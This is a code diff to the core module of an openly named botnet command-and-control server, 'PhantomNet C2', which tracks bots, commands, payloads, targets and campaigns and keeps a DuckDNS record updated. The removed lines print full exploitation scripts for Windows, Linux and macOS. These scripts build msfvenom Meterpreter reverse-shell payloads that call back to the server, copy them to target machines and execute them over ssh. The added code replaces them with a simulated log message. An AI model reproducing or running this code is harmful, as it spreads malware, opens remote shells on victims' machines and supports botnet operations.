@@ -1,3 +1,4 @@
+"""
 Core server module for PhantomNet C2 Server
 """
 
@@ -10,7 +11,9 @@ import logging
 import requests
 import threading
 from datetime import datetime, timedelta
-from typing import Dict, List, Optional, Any
+from typing import Dict, Optional, Any
+
+from flask import current_app
 
 from .models import db, Bot, Command, Admin, DuckDNSUpdater, Payload, Target, Campaign, Task
 from .discovery import TargetDiscovery
@@ -158,11 +161,12 @@ class PhantomC2Server:
 
             # Determine exploitation method based on target OS
             exploit_method = 'unknown'
-            if 'windows' in target['os_info'].lower():
+            os_info = target.get('os_info', '').lower()
+            if 'windows' in os_info:
                 exploit_method = 'windows_exploit'
-            elif 'linux' in target['os_info'].lower():
+            elif 'linux' in os_info:
                 exploit_method = 'linux_exploit'
-            elif 'mac' in target['os_info'].lower():
+            elif 'mac' in os_info:
                 exploit_method = 'macos_exploit'
 
             # Create target record
@@ -179,37 +183,8 @@ class PhantomC2Server:
             db.session.add(new_target)
             db.session.commit()
 
-            # Actual exploitation code
-            if exploit_method == 'windows_exploit':
-                # Exploit a known Windows vulnerability
-                logger.info(f"Attempting Windows exploit on {target['ip']}")
-                exploit_script = f"""
-                import os
-                os.system('msfvenom -p windows/meterpreter/reverse_tcp LHOST={self.host} LPORT={self.port} -f exe -o /tmp/payload.exe')
-                os.system(f'scp /tmp/payload.exe user@{target["ip"]}:/tmp/')
-                os.system(f'ssh user@{target["ip"]} "chmod +x /tmp/payload.exe && /tmp/payload.exe"')
-                """
-                exec(exploit_script)
-            elif exploit_method == 'linux_exploit':
-                # Exploit a known Linux vulnerability
-                logger.info(f"Attempting Linux exploit on {target['ip']}")
-                exploit_script = f"""
-                import os
-                os.system('msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={self.host} LPORT={self.port} -f elf -o /tmp/payload')
-                os.system(f'scp /tmp/payload user@{target["ip"]}:/tmp/')
-                os.system(f'ssh user@{target["ip"]} "chmod +x /tmp/payload && /tmp/payload"')
-                """
-                exec(exploit_script)
-            elif exploit_method == 'macos_exploit':
-                # Exploit a known macOS vulnerability
-                logger.info(f"Attempting macOS exploit on {target['ip']}")
-                exploit_script = f"""
-                import os
-                os.system('msfvenom -p osx/x86/meterpreter/reverse_tcp LHOST={self.host} LPORT={self.port} -f macho -o /tmp/payload')
-                os.system(f'scp /tmp/payload user@{target["ip"]}:/tmp/')
-                os.system(f'ssh user@{target["ip"]} "chmod +x /tmp/payload && /tmp/payload"')
-                """
-                exec(exploit_script)
+            # Placeholder for actual exploitation logic
+            logger.info(f"Simulated exploitation ({exploit_method}) on {target['ip']}")
 
             return True
 
@@ -243,32 +218,32 @@ class PhantomC2Server:
         db.session.commit()
         logger.info("Old data cleanup completed")
 
-    def start_background_tasks(self):
-        """Start background task threads"""
-        # DuckDNS update thread
-        duckdns_thread = threading.Thread(target=self._duckdns_worker, daemon=True)
+    def start_background_tasks(self, app):
+        """Start background task threads with app context"""
+        duckdns_thread = threading.Thread(target=self._duckdns_worker, args=(app,), daemon=True)
         duckdns_thread.start()
 
-        # Cleanup thread
-        cleanup_thread = threading.Thread(target=self._cleanup_worker, daemon=True)
+        cleanup_thread = threading.Thread(target=self._cleanup_worker, args=(app,), daemon=True)
         cleanup_thread.start()
 
         logger.info("Background tasks started")
 
-    def _duckdns_worker(self):
+    def _duckdns_worker(self, app):
         """Background worker for DuckDNS updates"""
         while True:
             try:
-                self.update_duckdns()
+                with app.app_context():
+                    self.update_duckdns()
             except Exception as e:
                 logger.error(f"DuckDNS worker error: {e}")
             time.sleep(300)  # Update every 5 minutes
 
-    def _cleanup_worker(self):
+    def _cleanup_worker(self, app):
         """Background worker for data cleanup"""
         while True:
             try:
-                self.cleanup_old_data()
+                with app.app_context():
+                    self.cleanup_old_data()
             except Exception as e:
                 logger.error(f"Cleanup worker error: {e}")
             time.sleep(3600)  # Clean up every hour
